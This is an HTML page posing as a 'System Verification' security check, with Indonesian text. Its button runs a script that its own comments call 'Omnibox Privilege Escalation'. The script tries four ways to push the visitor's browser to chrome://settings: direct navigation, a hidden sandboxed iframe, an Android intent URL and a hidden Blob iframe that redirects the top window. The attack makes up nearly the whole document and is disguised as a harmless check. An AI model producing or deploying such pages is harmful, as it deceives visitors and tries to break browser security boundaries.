<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #f4f6f8;
    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; flex-direction: column;
  }
  .panel {
    background: #fff; padding: 40px; border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
    max-width: 450px; width: 100%;
  }
  h1 { color: #333; margin-bottom: 10px; font-size: 22px; }
  p { color: #666; margin-bottom: 20px; font-size: 14px; }
  button {
    background: #007aff; color: #fff; padding: 15px;
    border-radius: 8px; font-size: 16px; font-weight: bold;
    cursor: pointer; border: none; width: 100%; margin-bottom: 10px;
  }
  button:hover { background: #005bb5; }
  #log {
    margin-top: 20px; background: #000; color: #0f0;
    padding: 10px; font-family: monospace; font-size: 12px;
    border-radius: 6px; width: 100%; max-width: 450px;
    height: 150px; overflow-y: auto; text-align: left;
  }
  iframe { display: none; }
</style>
</head>
<body>

<div class="panel">
  <h1>🔒 Security Check</h1>
  <p>Klik tombol di bawah untuk memverifikasi sistem.</p>
  <button id="bypassBtn">Verify System</button>
</div>

<div id="log">Sistem siap...</div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // Target URL Internal
  var internalUrl = "chrome://settings";

  document.getElementById('bypassBtn').addEventListener('click', function() {
    log("[!] Memulai Omnibox Privilege Escalation...");

    // ============================================
    // METODE 1: DIRECT NAVIGATION (Expected: Diblokir)
    // ============================================
    try {
      window.location.href = internalUrl;
      log("[+] Direct Navigation dicoba (kemungkinan besar diblokir).");
    } catch(e) {
      log("[-] Direct Nav error: " + e.message);
    }

    // ============================================
    // METODE 2: IFRAME SANDBOX (Celah UI Spoofing)
    // ============================================
    setTimeout(function() {
      var iframe = document.createElement('iframe');
      // Meminta izin untuk navigasi top-level dan eksekusi script
      iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
      iframe.src = internalUrl;
      iframe.style.display = "none";
      document.body.appendChild(iframe);
      log("[+] Iframe Chrome:// dicoba.");
    }, 500);

    // ============================================
    // METODE 3: INTENT REDIRECTION (Khusus Android)
    // ============================================
    // Format Intent untuk membuka internal settings Chrome
    setTimeout(function() {
      var intentUrl = "intent://settings/#Intent;scheme=chrome;package=com.android.chrome;end";
      try {
        window.location.href = intentUrl;
        log("[+] Intent Redirection (chrome://settings) dicoba.");
      } catch(e) {}
    }, 1000);

    // ============================================
    // METODE 4: BLOB WRAPPER (Bypass Parser)
    // ============================================
    setTimeout(function() {
      try {
        // Membungkus URL internal di dalam script Blob
        var blobPayload = `<script>window.top.location.href = "${internalUrl}";<\/script>`;
        var blob = new Blob([blobPayload], { type: 'text/html' });
        var url = URL.createObjectURL(blob);
        
        var iframe2 = document.createElement('iframe');
        iframe2.src = url;
        iframe2.style.display = "none";
        document.body.appendChild(iframe2);
        log("[+] Blob Wrapper Chrome:// dicoba.");
      } catch(e) {}
    }, 1500);

  });

})();
</script>
</body>
</html>
